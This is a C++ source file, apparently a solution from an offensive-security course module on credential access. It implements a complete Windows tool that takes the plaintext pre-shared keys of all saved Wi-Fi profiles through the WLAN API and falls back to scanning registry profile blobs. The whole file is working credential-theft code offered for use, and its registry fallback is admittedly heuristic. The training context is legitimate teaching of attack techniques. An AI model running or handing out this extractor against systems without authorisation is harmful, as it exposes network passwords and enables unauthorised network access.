/*
 * Solution 04 — Wi-Fi PSK Extractor (Complete)
 * Module 11: Credential Access
 *
 * Extracts Pre-Shared Keys from all saved Wi-Fi profiles using the
 * Native Wi-Fi (wlanapi) and, as a fallback, the Windows registry.
 *
 * Elevation required:
 *   WlanGetProfile with WLAN_PROFILE_GET_PLAINTEXT_KEY requires that the
 *   caller is a local administrator running in an elevated process.
 *   Without elevation, <keyMaterial> in the returned XML is obfuscated.
 *
 * Compile:
 *   g++ -std=c++17 -Wall -o sol04.exe sol04_wifi_psk.cpp -lwlanapi -lole32
 *
 * Usage:
 *   sol04.exe          (run as Administrator for plaintext keys)
 */

#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <stdio.h>
#include <string>
#include <vector>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

// ============================================================================
// Helpers
// ============================================================================

// Extract the first occurrence of text between <tag> ... </tag> in xml.
// Returns empty wstring if not found.
static std::wstring XmlExtract(const std::wstring& xml, const std::wstring& tag) {
    std::wstring open  = L"<"  + tag + L">";
    std::wstring close = L"</" + tag + L">";
    size_t s = xml.find(open);
    if (s == std::wstring::npos) return L"";
    s += open.size();
    size_t e = xml.find(close, s);
    if (e == std::wstring::npos) return L"";
    return xml.substr(s, e - s);
}

// Wide string -> narrow string (best-fit; OK for SSIDs and PSKs which are ASCII).
static std::string WideToNarrow(const std::wstring& w) {
    if (w.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), NULL, 0, NULL, NULL);
    if (n <= 0) return "";
    std::string s(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, NULL, NULL);
    return s;
}

// Convert a GUID to a {XXXXXXXX-...} string.
static std::string GuidToString(const GUID& g) {
    char buf[64];
    snprintf(buf, sizeof(buf),
        "{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        g.Data1, g.Data2, g.Data3,
        g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
        g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7]);
    return buf;
}

// ============================================================================
// Registry fallback
// Wlansvc stores binary profile blobs under:
//   HKLM\SOFTWARE\Microsoft\Wlansvc\Profiles\Interfaces\{IfGuid}\{ProfileGuid}
// The PSK is embedded in the binary data as a UTF-16 string; we scan for it.
// This approach is heuristic — it will not always work and requires SYSTEM access.
// ============================================================================
static std::string TryRegistryFallback(const std::string& ifGuidStr,
                                        const std::string& profileName) {
    std::string keyPath =
        "SOFTWARE\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\" + ifGuidStr;

    HKEY hIface = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0,
                      KEY_READ | KEY_WOW64_64KEY, &hIface) != ERROR_SUCCESS)
        return "";

    // Enumerate subkeys (one per profile GUID)
    DWORD idx = 0;
    char subkeyName[64] = {0};
    DWORD nameLen = sizeof(subkeyName);
    std::string found;

    while (RegEnumKeyExA(hIface, idx++, subkeyName, &nameLen,
                          NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        nameLen = sizeof(subkeyName);

        HKEY hProfile = NULL;
        if (RegOpenKeyExA(hIface, subkeyName, 0,
                          KEY_READ | KEY_WOW64_64KEY, &hProfile) != ERROR_SUCCESS)
            continue;

        // Read the binary blob value (name varies; try "" and "MSMSec")
        const char* valNames[] = { "MSMSec", "", "WLANProfile", NULL };
        for (int v = 0; valNames[v]; v++) {
            DWORD dataType = 0, dataSize = 0;
            if (RegQueryValueExA(hProfile, valNames[v], NULL, &dataType,
                                  NULL, &dataSize) != ERROR_SUCCESS) continue;
            if (dataType != REG_BINARY || dataSize < 8) continue;

            std::vector<BYTE> blob(dataSize);
            if (RegQueryValueExA(hProfile, valNames[v], NULL, NULL,
                                  blob.data(), &dataSize) != ERROR_SUCCESS) continue;

            // Search the binary data for our profile name as UTF-16, then look
            // for a PSK-length sequence nearby.  This is very heuristic.
            // A more reliable approach is to fully parse the WcnProfiles XML
            // from the blob.  For now, scan for the string "keyMaterial" in UTF-16.
            std::wstring needle = L"keyMaterial";
            const WCHAR* w     = (const WCHAR*)blob.data();
            DWORD        wlen  = (DWORD)(dataSize / sizeof(WCHAR));
            DWORD        nlen  = (DWORD)needle.size();
            for (DWORD i = 0; i + nlen < wlen; i++) {
                if (wcsncmp(w + i, needle.c_str(), nlen) == 0) {
                    // The value follows the tag name; skip angle-bracket pattern
                    // Typical layout: ...keyMaterial\0VALUE\0...  or XML text node
                    const WCHAR* psk = w + i + nlen + 1;
                    size_t pskLen = 0;
                    while (psk[pskLen] && psk[pskLen] != L'<' && pskLen < 128)
                        pskLen++;
                    if (pskLen >= 8) { // PSKs are at least 8 chars
                        found = WideToNarrow(std::wstring(psk, pskLen));
                        break;
                    }
                }
            }
            if (!found.empty()) break;
        }
        RegCloseKey(hProfile);
        if (!found.empty()) break;
    }

    RegCloseKey(hIface);
    return found;
}

// ============================================================================
// Process one profile on one interface
// ============================================================================
static void ProcessProfile(HANDLE hClient, const GUID& ifGuid,
                             const std::string& ifGuidStr,
                             const WCHAR* profileName) {
    PWSTR  pXml          = NULL;
    DWORD  dwFlags       = WLAN_PROFILE_GET_PLAINTEXT_KEY;
    DWORD  dwAccess      = 0;

    DWORD result = WlanGetProfile(
        hClient,
        &ifGuid,
        profileName,
        NULL,
        &pXml,
        &dwFlags,
        &dwAccess
    );

    std::string ssid = WideToNarrow(profileName);

    if (result == ERROR_SUCCESS && pXml) {
        std::wstring xml(pXml);
        WlanFreeMemory(pXml);

        std::wstring keyMaterial = XmlExtract(xml, L"keyMaterial");
        std::wstring authType    = XmlExtract(xml, L"authentication");
        std::wstring encryption  = XmlExtract(xml, L"encryption");

        std::string auth = WideToNarrow(authType);
        std::string enc  = WideToNarrow(encryption);
        std::string psk  = WideToNarrow(keyMaterial);

        if (psk.empty()) {
            // Open / no password profile
            printf("  %-35s | %-10s | %-10s | [OPEN — no PSK]\n",
                   ssid.c_str(), auth.c_str(), enc.c_str());
        } else {
            printf("  %-35s | %-10s | %-10s | %s\n",
                   ssid.c_str(), auth.c_str(), enc.c_str(), psk.c_str());
        }

    } else if (result == ERROR_ACCESS_DENIED) {
        // Try registry fallback
        std::string regPsk = TryRegistryFallback(ifGuidStr, ssid);
        if (!regPsk.empty()) {
            printf("  %-35s | %-10s | %-10s | %s [registry]\n",
                   ssid.c_str(), "-", "-", regPsk.c_str());
        } else {
            printf("  %-35s | %-10s | %-10s | [REQUIRES ELEVATION]\n",
                   ssid.c_str(), "-", "-");
        }
        if (pXml) WlanFreeMemory(pXml);

    } else {
        printf("  %-35s | WlanGetProfile error: %lu\n", ssid.c_str(), result);
        if (pXml) WlanFreeMemory(pXml);
    }
}

// ============================================================================
// main
// ============================================================================
int main() {
    printf("=== Solution 04: Wi-Fi PSK Extractor ===\n");
    printf("NOTE: Run as Administrator for plaintext keys.\n\n");

    // ---- Step 1: Open WLAN service handle ----
    HANDLE hClient             = NULL;
    DWORD  dwNegotiatedVersion = 0;

    DWORD result = WlanOpenHandle(2, NULL, &dwNegotiatedVersion, &hClient);
    if (result != ERROR_SUCCESS) {
        printf("[!] WlanOpenHandle failed: %lu\n", result);
        if (result == ERROR_SERVICE_NOT_ACTIVE)
            printf("    The WLAN AutoConfig service is not running.\n");
        return 1;
    }
    printf("[*] WLAN handle opened (negotiated version: %lu).\n", dwNegotiatedVersion);

    // ---- Step 2: Enumerate wireless interfaces ----
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;

    result = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (result != ERROR_SUCCESS) {
        printf("[!] WlanEnumInterfaces failed: %lu\n", result);
        WlanCloseHandle(hClient, NULL);
        return 1;
    }

    printf("[*] Found %lu wireless interface(s).\n\n", pIfList->dwNumberOfItems);

    // ---- Step 3 & 4: Per-interface profile extraction ----
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        WLAN_INTERFACE_INFO* pIface = &pIfList->InterfaceInfo[i];
        std::string ifGuidStr = GuidToString(pIface->InterfaceGuid);

        wprintf(L"Interface [%lu]: %s\n", i + 1, pIface->strInterfaceDescription);
        printf("  GUID: %s\n", ifGuidStr.c_str());

        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        result = WlanGetProfileList(hClient, &pIface->InterfaceGuid, NULL, &pProfileList);
        if (result != ERROR_SUCCESS) {
            printf("  [!] WlanGetProfileList failed: %lu\n", result);
            continue;
        }

        printf("  Profiles: %lu\n\n", pProfileList->dwNumberOfItems);
        printf("  %-35s | %-10s | %-10s | PSK\n", "SSID", "Auth", "Cipher");
        printf("  %s\n", std::string(90, '-').c_str());

        for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
            ProcessProfile(hClient, pIface->InterfaceGuid, ifGuidStr,
                           pProfileList->ProfileInfo[j].strProfileName);
        }

        WlanFreeMemory(pProfileList);
        printf("\n");
    }

    // ---- Step 5: Clean up ----
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);

    printf("[*] Done.\n");
    return 0;
}
